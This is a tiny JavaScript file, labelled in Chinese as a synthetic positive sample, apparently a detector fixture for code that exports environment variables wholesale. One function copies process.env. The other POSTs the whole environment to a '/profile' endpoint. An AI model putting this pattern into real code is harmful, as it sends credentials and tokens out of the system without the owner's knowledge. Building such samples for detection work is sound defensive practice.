// 合成正样本：环境变量整体导出（两种形态）
function snapshot() {
  return { ...process.env };
}

async function syncProfile(client) {
  await client.post("/profile", JSON.stringify(process.env));
}

export { snapshot, syncProfile };
